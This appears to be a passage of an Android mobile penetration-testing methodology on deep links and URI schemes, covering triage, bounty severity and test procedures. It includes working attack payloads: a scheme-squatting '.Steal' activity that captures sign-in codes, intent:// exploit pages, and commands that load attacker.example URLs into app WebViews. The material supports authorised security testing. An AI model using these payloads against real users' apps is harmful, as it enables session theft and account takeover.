# D09 · Deep Links, App Links & Custom URI Schemes

> This is the surface where a tap on a web page becomes code running inside the app with the victim's
> session. Its ceiling is genuinely P1 — an intercepted magic link or OAuth code is
> `broken_authentication_and_session_management.authentication_bypass`, and a router parameter that reaches a
> session-bearing WebView is `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` —
> but the *manifest observation* that gets reported instead ("`autoVerify` is missing") is worth nothing, and
> the VRT has no node for it at all.

| | |
|---|---|
| **Phases** | P3 attack-surface inventory, P4 static deep review, P5 IPC & component attack (escalation deferred to P7) |
| **Milestones** | M3, M4, M5 |
| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) when an intercepted link completes a login; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the router leaks a session token to your origin; `server_side_injection.file_inclusion.local` (P1) for the `file://`-through-the-router read; `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) for the redeemed authorization code. Routine landing zone: `broken_access_control.exposed_sensitive_android_intent` — **priority null, rated entirely on what you demonstrate** |
| **Primary attacker model** | **AM-02** remote one click (the model this domain exists for); AM-03 zero-permission local app for every squat/interception item; AM-08 for SDK-owned schemes; AM-04 for the notification-listener and shortcut variants |
| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4, MASVS-AUTH-1, MASVS-AUTH-3; MASTG-TEST-0028, MASTG-TEST-0393, MASTG-TEST-0394; MASTG-TECH-0172, MASTG-TECH-0173, MASTG-TECH-0174; MASTG-KNOW-0019, MASTG-BEST-0070, MASTG-BEST-0071, MASTG-TOOL-0032, MASTG-DEMO-0152; rules `mastg-android-deeplink-autoverify-missing`, `mastg-android-deeplink-unvalidated-parameter`, `mastg-android-custom-deeplink-scheme`; MASWE-0029, MASWE-0018, MASWE-0050; CWE-939, CWE-917, CWE-20, CWE-22, CWE-306, CWE-862, CWE-601; ATT&CK T1635, T1635.001, T1456, T1660, T1655.001, T1407 |

## Why this domain pays

Three things make deep links the highest-yield mobile-native surface. First, the attacker model: a deep link
is **AM-02**, remote with one click, which is the strongest model any purely client-side Android bug reaches.
Nothing else in the checklist converts a manifest line into "any web page the victim visits" for free.
Second, the base rate of a *correct* validator is low — Liu et al. (USENIX Security 2017, cited in the corpus)
measured that **only two percent of Android apps shipping deep links passed full App Link verification**, and
Oversecured's own deep-link taxonomy exists because the same five bypasses keep working. Third, the payouts
are real and public: KAYAK #1667998 (**Critical 9.3**, one-click ATO via `EXTRA_REDIRECT_URL`), Basecamp
#1372667 (**High 8.7, $6,337**, `proceed_to` surviving the internal-URL check), Grab #401793
(**High 7.1, $7,500** per Intigriti's write-up, deep link → WebView → `getGrabUser` bridge), TikTok #2417516
(**High 8.1, CVE-2024-45240**), Zomato #532225 (High, $750), Periscope #583987 (Low, but **$1,540** — and the
iOS twin #805073 paid **$2,940**).

Be honest about the other half. The *observation* that this domain most often produces is graveyard material.
A missing `android:autoVerify="true"` is not a finding: Bugcrowd's VRT has no node for it, Reddit's programme
excludes it by name ("Deep links for Android missing `autoVerify=true` due to current Google limitation with
AMP"), and Starbucks excludes the whole class ("Deeplink issues that require a victim user to interact with a
link or malicious app as part of the POC"). Google's Mobile VRP prices it but discounts it hard — "user must
follow a link" is half the remote rate and "user must install malicious app" is **5%** of it, $15,000 against
$300,000 at Tier 1. Shopify rated a complete magic-link ATO (#855618) **Low** because a malicious app was in
the precondition. The exception — the thing that moves you from the graveyard to P1 — is always the *sink* or
the *intercepted secret*, never the manifest attribute. And the single highest-leverage decision in the whole
domain is re-engineering the PoC so it fires from a plain web page rather than from an installed app: that one
change moves the Google VRP column from 5% to 50%.

The corollary for your engagement plan: in P3 you build the inventory, in P4 you read the router, and in P5
you fire it — but you do not chase a chain until P7. A deep-link primitive is cheap to confirm and expensive
to weaponise; confirming twelve of them beats weaponising one.

## The crux question

**Does any URI an attacker can put in front of the victim — a web link, a QR code, a push payload, another
app's intent — reach a parser inside this app that hands attacker-controlled bytes to a sink that runs with
the user's session, and is the entry point ownership-verified on the device or merely claimed in the
manifest?**

## Triage order

1. **`pm get-app-links` on the device** (D09-014). One command, and it decides whether every interception
   item below is live or dead. Do it before you read a line of the manifest, because the manifest lies.
2. **Census BROWSABLE filters and expand the `<data>` cross-product** (D09-001, D09-002). Two greps produce
   the entire candidate set; the cross-product routinely reveals a scheme/host pair nobody intended.
3. **Classify by ownership proof** (D09-006). Verified App Link, unverified https, custom scheme — three
   different attacker stories and three different severities. Never mix them in one finding.
4. **Trace the router to the sink** (D09-041). The route table is the artefact triagers want and the
   prioritiser for everything that follows. Rank routes by sink: WebView first, payment second, file third.
5. **`url=` → `loadUrl`** (D09-059, D09-060). The single most-paid shape in the corpus. If the WebView
   attaches auth headers, the header dump *is* the finding — a screenshot of your page is not.
6. **The host-validation bypass matrix** (D09-042 → D09-047). Run the whole matrix, not one payload; apps
   harden one alias and forget the sibling.
7. **Custom-scheme / unverified-host squat** (D09-026 → D09-031). Highest ceiling in the domain, but it
   drags an installed-app precondition with it — build it only once you know a token travels that way.
8. **Redirect-after-check and session-appending** (D09-061, D09-062). The two shapes that produced the
   corpus's two biggest single payouts; both are one grep away.
9. **Fire every route cold and cross-user** (D09-066 → D09-068). Cheap, and it is where the P1 IDOR is.
10. **Framework handoffs** (D09-009 → D09-011, D09-047, D09-053). A Flutter or RN app looks like it has no
    deep-link handling in Java, which is exactly why nobody tests it.
11. **The exotic delivery vectors** (D09-035 → D09-039). Low base rate, but they remove the "requires a
    malicious app" caveat from a finding you already have.
12. **Discipline items** (D09-075 → D09-080) last, but before you write a word of the report.

## Items

### D09-001 · Census every BROWSABLE filter in the merged manifest, resolving string references

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0172 (Listing Deep Links); drozer `scanner.activity.browsable`; MASTG-TEST-0028 |

- **Test:** Produce the complete `scheme://host:port/path → component` table from the **merged** manifest, not
  from source, and resolve every `@string/...` reference — schemes and hosts are routinely held in
  `res/values/strings.xml` and flavour-overridden, so a source read gives you the wrong host set.
- **How:**
  ```bash
  apktool d -f base.apk -o out                      # decodes the binary manifest
  apkanalyzer manifest print base.apk > out/AndroidManifest.merged.xml   # includes library contributions
  python3 - <<'PY'
  import re, os
  m = open('out/AndroidManifest.merged.xml').read()
  strings = {}
  p = 'out/res/values/strings.xml'
  if os.path.exists(p):
      strings = dict(re.findall(r'<string name="([^"]+)"[^>]*>([^<]*)</string>', open(p).read()))
  def deref(v): return strings.get(v[8:], v) if v.startswith('@string/') else v
  n = 0
  for blk in re.finditer(r'<(activity|activity-alias)\b(.*?)</\1>', m, re.S):
      body = blk.group(0)
      comp = re.search(r'android:name="([^"]+)"', body)
      for f in re.findall(r'<intent-filter.*?</intent-filter>', body, re.S):
          if 'android.intent.category.BROWSABLE' not in f: continue
          av  = 'autoVerify="true"' in f
          sch = [deref(x) for x in re.findall(r'android:scheme="([^"]+)"', f)]
          hos = [deref(x) for x in re.findall(r'android:host="([^"]+)"', f)]
          pat = [(k, deref(v)) for k, v in re.findall(r'android:(path|pathPrefix|pathPattern|pathSuffix|pathAdvancedPattern)="([^"]+)"', f)]
          print(('AV ' if av else '   '), comp.group(1) if comp else '?', '|', sch, hos, pat)
          n += 1
  print('BROWSABLE filters:', n)          # count them; a silent zero is a failed parse, not a clean app
  PY
  ```
  Cross-check with two independent readers, because a hand-rolled regex misses `activity-alias` and
  library-merged filters:
  ```bash
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Receiver Resolver/p' \
    | grep -E 'Scheme|Authority|Non-Data Actions|Action:|^\s+[a-z0-9.+-]+:'
  drozer console connect -c "run scanner.activity.browsable -a com.target.app"
  ```
- **Proof:** A table with one row per filter: component, exported yes/no, scheme, host, path matchers,
  `autoVerify` yes/no, and the declared count. This table is the chapter's worksheet — every later item
  consumes a row of it. State the count explicitly in the report appendix.
- **Escalation:** Each custom-scheme row becomes a D09-026 squat candidate; each `https` row becomes a
  D09-014 verification check; each row is fired in D09-013.
- **Ruled out when:** The merged manifest contains **no** `<intent-filter>` carrying
  `android.intent.category.BROWSABLE`, **and** `dumpsys package` shows no schemes in the Activity Resolver
  Table, **and** no in-code router exists (D09-004). Record the zero count plus the three commands. "MobSF
  did not list deep links" is not a negative.

### D09-002 · Expand the `<data>` cross-product — attributes merge, they do not pair

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the unintended combination reaches) |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0172 (documents the merge behaviour with a worked example); MASTG-KNOW-0019; `guide/topics/manifest/data-element` |

- **Test:** Android documents this verbatim: "All the `<data>` elements contained within the same
  `<intent-filter>` element contribute to the same filter." Two `<data>` lines are not two URLs — they are the
  **cross product**. A filter declaring `https`+`www.example.com` and `app`+`open.my.app` really handles
  `https://www.example.com`, `app://open.my.app`, **`app://www.example.com`** and **`https://open.my.app`**.
  The unintended combinations are usually unverifiable (a custom scheme can never be autoVerified), so they
  are a free hijackable entry into an otherwise App-Link-protected handler.
- **How:**
  ```bash
  # print each multi-<data> filter, then expand it by hand
  python3 - <<'PY'
  import re, itertools
  m = open('out/AndroidManifest.merged.xml').read()
  for f in re.findall(r'<intent-filter.*?</intent-filter>', m, re.S):
      if 'BROWSABLE' not in f: continue
      sch = re.findall(r'android:scheme="([^"]+)"', f) or ['<none>']
      hos = re.findall(r'android:host="([^"]+)"', f) or ['<any>']
      pth = re.findall(r'android:path(?:Prefix|Pattern|Suffix)?="([^"]+)"', f) or ['/']
      if len(sch)*len(hos)*len(pth) > 1:
          for s,h,p in itertools.product(sch,hos,pth): print(f'{s}://{h}{p}')
  PY
  ```
  Then drive every combination the developer plainly did not intend, especially any `http://` variant:
  ```bash
  adb shell am start -W -a android.intent.action.VIEW -d "https://open.my.app/pay" com.target.app
  adb shell am start -W -a android.intent.action.VIEW -d "http://www.example.com/pay" com.target.app
  ```
  Remember the two suppression rules from the same document: **if no `scheme` is specified every other URI
  attribute is ignored**, and **if no `host` is specified the `port` and all path attributes are ignored** —
  a filter with only `android:path` and no host matches *any* host.
- **Proof:** `am start -W` returning `Status: ok` with the target activity resolved for a combination that
  appears nowhere in the app's own links — e.g. `http://` accepted on a host the developer serves only over
  HTTPS, or a production path reachable on a staging host.
- **Escalation:** An `http://` combination accepted on a token-bearing route is a cleartext-link acceptance
  → D14; a custom-scheme combination on an App-Link host restores the whole D09-026 squat surface.
- **Ruled out when:** Every BROWSABLE filter declares exactly one `<data>` element, or the expansion produces
  only combinations that also appear in the app's own emitted links (compare against D09-005's `emitted.txt`).
  Paste the expansion output as the negative.

### D09-003 · Attribute every scheme to the AAR that contributed it

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | all; especially apps bundling OAuth, chat, attribution or payment SDKs |
| **Maps to** | Google Play ASI campaign **"Scheme Hijacking"** (started 2018-11-15); Oversecured SDK-security post ("SDKs adding URI schemes without origin validation or replay protection enable sensitive actions inside the app under the user's identity") |

- **Test:** The client's engineers can account for the schemes they wrote. They cannot account for the ones an
  AAR merged in. SDK-owned schemes are unreviewed entry points that reach SDK parsers nobody on the team has
  read, and they are the single most common source of "we didn't know that was there".
- **How:**
  ```bash
  python3 - <<'PY'
  import re
  m = open('out/AndroidManifest.merged.xml').read()
  for a in re.finditer(r'<(activity|activity-alias|receiver|service)\b.*?</\1>', m, re.S):
      blk = a.group(0)
      n = re.search(r'android:name="([^"]+)"', blk)
      for s in re.findall(r'android:scheme="([^"]+)"', blk):
          print(f'{s:28} -> {n.group(1) if n else "?"}')
  PY
  # if the client can give you a build, the merger report names the contributing AAR per node
  grep -n 'scheme' app/build/outputs/logs/manifest-merger-release-report.txt
  # otherwise attribute by package prefix of the handling class
  ```
  Fire each SDK-owned scheme as its own entry point — it is not covered by the first-party router review:
  ```bash
  adb shell am start -W -a android.intent.action.VIEW -d "<sdkscheme>://host/path?x=1" com.target.app
  ```
- **Proof:** The scheme → handler class → contributing library table, plus a `dumpsys activity activities`
  line showing an **SDK** activity resumed on an externally supplied URI.
- **Escalation:** SDK scheme → SDK parser → `Intent.parseUri` / `loadUrl` / token exchange (D09-065, D09-059);
  a shared SDK's scheme is claimable across every app embedding it (D09-034) → D18 SDK configuration.
- **Ruled out when:** Every scheme in the merged manifest maps to a handler class under the app's own package
  prefix, and the merger report (or a jadx package census) attributes no `<data android:scheme>` to a library.
  Name the libraries you checked.

### D09-004 · Enumerate the routes declared in code, not in the manifest

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — inventory |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | all; mandatory for apps with a single trampoline activity |
| **Maps to** | MASTG-TECH-0172; MASTG-TEST-0394 (`getQueryParameter`, `getPathSegments`, `getLastPathSegment` as the extraction APIs) |

- **Test:** The manifest names the *doorway*; the route table is in code. The common shape is one trampoline
  activity claiming `scheme://*` and a big `switch` on a host or a query parameter, where **every case is a
  reachable action from an untrusted link**. Reading only the manifest gives you one entry and zero routes.
- **How:**
  ```bash
  jadx -d out --deobf base.apk
  # the extraction APIs
  grep -rnE 'getIntent\(\)\.getData\(\)|intent\.getData\(\)|onNewIntent|getDataString\(\)|getQueryParameter\(|getQueryParameterNames\(|getPathSegments\(|getLastPathSegment\(|Uri\.parse\(' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material)/' > /tmp/d09_extract.txt
  wc -l /tmp/d09_extract.txt        # count it; an empty file means your paths are wrong, not that the app is clean
  # the route dispatchers
  grep -rnE 'switch *\(|when *\(|route\(|navigate\(|deeplink|DeepLink|Router|NavGraph|NavDeepLink|routeTo|handleUri' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin)/' | head -100
  # Jetpack Navigation declares deep links in XML too
  grep -rn '<deepLink' out/res/navigation/ 2>/dev/null
  ```
  Follow the trampoline by hand: `getIntent().getData()` → the host/param that selects the route → the map of
  remaining parameters → the dispatcher. (Worked shape from the corpus: a `TrampolineActivity` reading
  `host_internal=` and passing all query parameters as a `data` map into a single dispatch method.)
- **Proof:** A route table — route name · target activity or action · parameters consumed · authentication
  required yes/no · sink class. One row per case of the dispatcher.
- **Escalation:** Routes reaching a WebView → D09-059; routes reaching a payment or account action →
  D09-066; routes reaching a component launcher → D08 intent redirection.
- **Ruled out when:** Every BROWSABLE activity handles its own URI inline with no dispatcher, and the
  extraction grep returns hits only inside `android*`/`kotlin` packages. Paste the counted grep.

### D09-005 · Schemes the app emits but never registers

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the intercepted value completes a login; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | **CVE-2026-26123** — Microsoft Authenticator (Android and iOS) emitted a QR-onboarding deep link on the `ms-msa://` scheme **without registering an intent filter for it**, so any sibling app could claim `ms-msa://` and receive the embedded sign-in code; fixed in the March 2026 update. ATT&CK T1635.001 URI Hijacking |

- **Test:** The inverse of squatting, and structurally invisible to a manifest review. The app *sends* a URI
  on a scheme it never claims. Nobody wins a chooser; the attacker is the only handler, so delivery is silent.
- **How:**
  ```bash
  # every scheme-looking literal the code emits
  grep -rhoE '"[a-z][a-z0-9+.-]{2,30}://' out/sources/ | tr -d '"' | sed 's|://||' | sort -u > /tmp/emitted.txt
  grep -rhoE 'Uri\.parse\("([a-z][a-z0-9+.-]{2,30}):' out/sources/ | grep -oE '"[a-z][a-z0-9+.-]+:' | tr -d '":' | sort -u >> /tmp/emitted.txt
  # every scheme the app claims
  grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u > /tmp/declared.txt
  sort -u /tmp/emitted.txt -o /tmp/emitted.txt
  comm -23 /tmp/emitted.txt /tmp/declared.txt | grep -vE '^(https?|file|content|mailto|tel|sms|geo|market|intent|android-app|package)$'
  wc -l /tmp/emitted.txt /tmp/declared.txt     # count both; a zero on either side is a broken grep
  ```
  For each unclaimed scheme, confirm nothing on a clean device handles it, then claim it:
  ```bash
  adb shell pm query-activities -a android.intent.action.VIEW -d "ms-msa://x" | grep -E 'packageName|name='
  ```
  ```xml
  <activity android:name=".Steal" android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.VIEW"/>
      <category android:name="android.intent.category.DEFAULT"/>
      <category android:name="android.intent.category.BROWSABLE"/>
      <data android:scheme="ms-msa"/>
    </intent-filter>
  </activity>
  ```
- **Proof:** `pm query-activities` returning **no handler** for the scheme on a clean device (so there is no
  chooser and no ambiguity), then your activity's `getIntent().getDataString()` logging the one-time code or
  token during the real flow, then that value replayed against the backend for a `200` as the victim.
- **Escalation:** → D13 account takeover; → D15 to prove the token actually works rather than merely exists.
- **Ruled out when:** `comm -23` is empty after filtering platform schemes, or every unclaimed scheme carries
  only non-secret content (a marketing URL, a store listing) — quote the emitted literal and the code path
  that builds it.

### D09-006 · Classify every entry point by its ownership proof before rating anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — the classifier that decides which VRT path every later item uses |
| **Attacker** | AM-02 vs AM-03 — this item is what decides which |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0019; MASTG-TEST-0393; RFC 8252 (private-use URI schemes: "multiple apps can typically register the same scheme, making it indeterminate as to which app will receive the authorization code") |

- **Test:** Three classes with three different attacker stories. **(a) Verified App Link** — `https`,
  `autoVerify="true"`, and `pm get-app-links` says `verified`: interception is *closed*; the residual risk is
  path scope (D09-055). **(b) Unverified https** — claimable by any installed app, and on Android 12+ the
  browser sends it to the browser rather than the app, so the hijack is app-to-app, not browser-to-app.
  **(c) Custom scheme** — no ownership proof exists on Android, ever, at any API level. Reporting all three
  as "deep link hijacking" is the fastest way to have the good one closed with the bad ones.
- **How:** Build the classifier column on the D09-001 table:
  ```bash
  PKG=com.target.app
  adb shell pm get-app-links "$PKG"     # API 31+; states: none|verified|approved|denied|migrated|restored|legacy_failure|system_configured|>=1024
  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u); do
    S=$(adb shell pm get-app-links "$PKG" | grep -F "$H" | head -1)
    printf '%-40s %s\n' "$H" "${S:-<not claimed as an app link>}"
  done
  ```
- **Proof:** The three-column table: entry point · class (a/b/c) · on-device verification state. Every later
  finding cites its row. A finding that says "custom scheme" when the row says "verified App Link" is wrong
  and will be closed.
- **Escalation:** Class (b) and (c) rows feed D09-026 → D09-031; class (a) rows feed D09-055.
- **Ruled out when:** Every row is class (a) with state `verified` and no custom scheme exists anywhere in
  the merged manifest. That is a genuine, defensible negative for the entire interception half of this
  chapter — write it as one, with the `pm get-app-links` output pasted.

### D09-007 · Prove browser reachability, not adb reachability

| | |
|---|---|
| **Severity ceiling** | Support (but it is what converts every finding below from AM-03 to AM-02) |
| **VRT** | none — the evidence rule that sets the attacker model on every other item |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | Google Mobile VRP interaction tiers ("user must follow a link" = half the remote rate; "user must install malicious app" = 5% of it); MASTG-TECH-0173's own caveat about the disambiguation dialog |

- **Test:** `adb shell am start` runs as `shell`, which holds more privilege than any real attacker and
  bypasses resolution questions entirely. A finding proved only with `am start` has established nothing about
  who can reach it. Re-prove each candidate from a real page in the device's default browser.
- **How:** Serve one page and open it on the device:
  ```html
  <!doctype html><meta charset=utf-8><title>d09</title>
  <p><a id=a href="targetapp://route?x=1">anchor (user gesture)</a></p>
  <p><a href="intent://route#Intent;scheme=targetapp;package=com.target.app;S.x=1;end">intent:// with package</a></p>
  <iframe src="targetapp://route?x=1" style="width:1px;height:1px"></iframe>
  <script>setTimeout(()=>{location='targetapp://route?x=1'},1500)</script>
  ```
  ```bash
  python3 -m http.server 8000 &
  adb reverse tcp:8000 tcp:8000
  adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8000/d09.html -p com.android.chrome
  adb logcat -d -s ActivityTaskManager | grep -iE 'START u0.*com\.target\.app' | tail -5
  ```
- **Proof:** The `ActivityTaskManager: START u0 {...cmp=com.target.app/...}` logcat line whose **caller is the
  browser package**, plus a screen recording of the tap. State in the report which delivery form worked:
  anchor tap, gesture-less `location=`, iframe, or `intent://`.
- **Escalation:** Browser-reachable converts the finding to AM-02 and roughly doubles its VRP tier; a route
  reachable only from an installed app stays AM-03 and must say so in the first paragraph.
- **Ruled out when:** No delivery form starts the activity from a browser — record which browser and version,
  because this is version-dependent (D09-008). An `https` entry that Android 12+ routes to the browser instead
  of the app is *not* browser-reachable; say so explicitly rather than claiming a one-click bug.

### D09-008 · Per-browser `intent://` capability matrix

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — reach calibration for every AM-02 claim |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks`; the `intent://…#Intent;…;end` grammar with `S.browser_fallback_url` |

- **Test:** "A web page can fire an `intent://`" is not one capability. Chrome, Firefox, Samsung Internet and
  every embedded WebView (Facebook, Instagram, Gmail in-app browsers) differ on whether a user gesture is
  required, whether `category=BROWSABLE` is enforced, whether extras survive, whether
  `S.browser_fallback_url` is honoured, and — decisively — whether an explicit `component=` is respected.
  A finding that works only in one sideloaded browser has a different severity from one that works in the
  device default.
- **How:** Host one page with all variants and open it in each browser in turn:
  ```html
  <a href="intent://host/path#Intent;scheme=tgt;package=com.target.app;S.token=X;end">scheme+package</a>
  <a href="intent:#Intent;component=com.target.app/.PrivateActivity;end">direct component</a>
  <a href="intent://x#Intent;scheme=tgt;S.browser_fallback_url=https%3A%2F%2Fattacker.example%2F;end">fallback</a>
  <a href="intent://x#Intent;scheme=tgt;launchFlags=0x10000000;end">with flags</a>
  ```
  ```bash
  for B in com.android.chrome org.mozilla.firefox com.sec.android.app.sbrowser com.opera.browser; do
    adb shell pm list packages | grep -q "$B" || { echo "SKIP $B"; continue; }
    adb shell dumpsys package "$B" | grep -m1 versionName
    adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8000/d09.html -p "$B"
    sleep 4
    adb logcat -d -s ActivityTaskManager | grep -i 'START u0.*com.target.app' | tail -3
    adb logcat -c
  done
  ```
- **Proof:** A dated per-browser table — browser, version, which variant landed, and the backing
  `ActivityTaskManager: START` line naming the source package and resolved component.
- **Escalation:** The browser that honours `component=` turns any deep-link finding into arbitrary
  non-exported-component reach → D08. That is the row that matters; everything else is calibration.
- **Ruled out when:** No browser on the target's supported set fires any variant, or the app declares no
  scheme an `intent://` can name. Date the table — browser behaviour changes between releases, so a matrix
  without versions and a date is not a negative.

### D09-009 · Flutter: `flutter_deeplinking_enabled` defaults to ON, so jadx shows you nothing

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the Dart route reached) |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | Flutter apps using the v2 embedding (`io.flutter.embedding.android.FlutterActivity`) |
| **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` — `HANDLE_DEEPLINKING_META_DATA_KEY = "flutter_deeplinking_enabled"`, documented default **true**; `EXTRA_INITIAL_ROUTE = "route"`; MASTG-TECH-0172 |

- **Test:** `FlutterActivityLaunchConfigs.deepLinkEnabled(metaData)` returns **true when the key is missing**.
  So a Flutter activity with a `VIEW`+`BROWSABLE` filter hands the incoming URI straight to the Dart router
  with no Java-side allow-listing, and a tester who greps Java for `getData()` finds nothing and wrongly
  closes the surface. Two posture questions follow: does `MainActivity.getInitialRoute()` validate before the
  handoff, and is `android:intentMatchingFlags="enforceIntentFilter"` set (D09-053)?
- **How:**
  ```bash
  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.merged.xml || echo "ABSENT -> deep linking is ENABLED"
  grep -rn 'getInitialRoute\|FlutterActivity\|FlutterFragmentActivity\|io.flutter.embedding' out/sources/ | head
  grep -B3 -A20 'android.intent.action.VIEW' out/AndroidManifest.merged.xml
  # recover the Dart route table from the AOT snapshot
  strings -8 lib/arm64-v8a/libapp.so | grep -E '^/[a-z0-9_/:-]{3,}$' | sort -u | head -60
  strings -8 lib/arm64-v8a/libapp.so | grep -iE 'allowedHost|isAllowed|instanceHostname|getAuthenticatedEmbedUrl|sandbox'
  adb shell am start -a android.intent.action.VIEW -d "myapp://admin/debug" com.target.app
  adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/internal/tools" com.target.app
  ```
  Read the decompiled `getInitialRoute()`. A robust shell anchors a regex with `matcher.matches()` requiring
  `/` or end-of-string after the locked host, so `.evil.com` suffix and `@evil.com` userinfo both fail; a weak
  shell returns `intent.getData().toString()` **raw**.
- **Proof:** The URI path rendered as a Dart route on screen (screen recording), or the route name observed in
  a hook on the router recovered with Blutter, with the decompiled `getInitialRoute()` body showing no
  allow-list. Quote the body.
- **Escalation:** → D19 framework internals for the Dart route table; → D09-059 if the route loads the URI in
  a WebView; → D09-047 for the Java-vs-Dart parser differential.
- **Ruled out when:** `flutter_deeplinking_enabled` is explicitly `false` **and** the Java shell handles the
  URI itself, or `getInitialRoute()` validates against an anchored host allow-list you have read. **Bound it
  honestly**: if the Dart router parses by path pattern, validates the instance host, and renders through a
  *server-minted authenticated embed URL* so the attacker's host never loads, the finding is Low
  defence-in-depth, not High — see D09-075.

### D09-010 · React Native: the Java→JS `Linking` handoff

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-02, AM-03 |
| **Applies to** | React Native apps (`index.android.bundle`, Hermes or JSC) |
| **Maps to** | MASTG-TECH-0172, MASTG-TECH-0173; React Native `Linking.getInitialURL()` / `Linking.addEventListener('url', …)` |

- **Test:** In RN the URI crosses a boundary: Java `ReactActivity` receives it, JS consumes it. The validator,
  if any, lives on one side and the sink on the other — and the consuming side almost always trusts the URI.
  Recover the JS route table from the bundle; it is not in the manifest and not in Java.
- **How:**
  ```bash
  # locate and normalise the bundle (re-base on the ON-DEVICE bundle if the app does OTA — see D17)
  find out/assets -name 'index.android.bundle' -o -name '*.hbc'
  file out/assets/index.android.bundle          # "Hermes JavaScript bytecode" vs plain JS
  # plain JS bundle:
  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' out/assets/index.android.bundle | sort -u | head -60
  grep -ao 'getInitialURL\|addEventListener("url"\|Linking\.' out/assets/index.android.bundle | head
  # Hermes bytecode: pull the string table first
  hbcdump -c 'strings' out/assets/index.android.bundle > /tmp/hbc.strings 2>/dev/null \
    || strings -8 out/assets/index.android.bundle > /tmp/hbc.strings
  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' /tmp/hbc.strings | sort -u
  grep -aiE 'getInitialURL|deeplink|linking|navigate|screen|route' /tmp/hbc.strings | sort -u | head -60
  ```
  Then drive each recovered route and watch both sides:
  ```bash
  adb shell am start -a android.intent.action.VIEW -d "targetapp://<recovered-route>?url=https://attacker.example/" com.target.app
  adb logcat -s ReactNativeJS:V | tail -40
  ```
- **Proof:** The attacker-supplied URI observed **inside the JS layer** (a `ReactNativeJS` log line carrying
  the URL, or the navigated screen name) with no allow-list between it and the sink.
- **Escalation:** → D19 for the bundle-level review; → D09-059 when the URL reaches a WebView;
  → D17 if the bundle is OTA-delivered, because the code you read is not the code that runs.
- **Ruled out when:** The bundle contains no `Linking` usage and the Java side handles the URI itself with a
  validator you have read; or the app is RN but declares no BROWSABLE filter. Say which bundle (packaged or
  on-device) you analysed and its hash.

### D09-011 · Cordova / Capacitor: `appUrlOpen`, `allow-navigation` and `server.url`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) once the attacker origin reaches the plugin bridge |
| **Attacker** | AM-02 |
| **Applies to** | Cordova, Ionic, Capacitor |
| **Maps to** | Cordova `WhitelistPlugin.java` (`<allow-navigation href="*">` expands to `http://*/*`, `https://*/*` **and `data:*`**); Capacitor `Bridge.java` `allowedOriginRules` from `server.allowNavigation`; Capacitor `CapConfig.java` (`server.url`, `server.hostname`, `server.androidScheme`, `server.cleartext`) |

- **Test:** In a Cordova/Capacitor app the *entire app* is one WebView with the plugin bridge attached. If a
  deep link, an `appUrlOpen` handler, or an `allow-navigation` wildcard lets that WebView top-level navigate
  off-origin, the attacker origin inherits every plugin. There is no separate "WebView finding" — the deep
  link *is* the WebView finding.
- **How:**
  ```bash
  grep -nE '<allow-navigation|<allow-intent|<access ' out/res/xml/config.xml 2>/dev/null
  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(json.dumps(d,indent=2))" 2>/dev/null | grep -A10 '"server"'
  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location\|Browser\.open' out/assets/www out/assets/public 2>/dev/null | head
  adb shell am start -a android.intent.action.VIEW -d "targetapp://?redirect=https://attacker.example/x.html" com.target.app
  ```
  From the loaded attacker page, test whether the bridge survived the navigation:
  ```javascript
  console.log(typeof _cordovaNative, typeof cordova, cordova && typeof cordova.exec);
  console.log(typeof androidBridge, typeof CapacitorHttpAndroidInterface, typeof Capacitor);
  Capacitor && Capacitor.Plugins && Object.keys(Capacitor.Plugins);
  ```
- **Proof:** Your page rendered inside the app WebView **and** a plugin call from it returning data — for
  example a filesystem plugin returning app-private content. A screenshot of your page alone is not the
